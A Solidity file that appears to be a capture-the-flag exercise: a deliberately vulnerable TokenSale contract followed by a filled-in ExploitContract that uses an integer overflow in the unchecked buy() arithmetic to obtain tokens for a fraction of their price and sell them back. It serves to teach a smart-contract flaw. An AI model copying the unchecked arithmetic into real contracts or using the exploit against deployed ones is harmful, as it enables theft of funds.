// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    // total += numTokens * PRICE_PER_TOKEN;
    // overflow it  
    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    function buy() public payable {
        uint256 val;
        uint256 UINT256_MAX = type(uint).max;
        unchecked {
            // val = 415992086870360064 ~= 0.416 ether
            val = (UINT256_MAX / 1 ether + 1) * 1 ether;
            emit Log(val);
        }
        tokenSale.buy{value: val}(UINT256_MAX / 1 ether + 1);
    }

    function sell(uint num) public {
        tokenSale.sell(num);
    }

    receive() external payable {}
    // write your exploit functions below

    event Log(uint256);
}
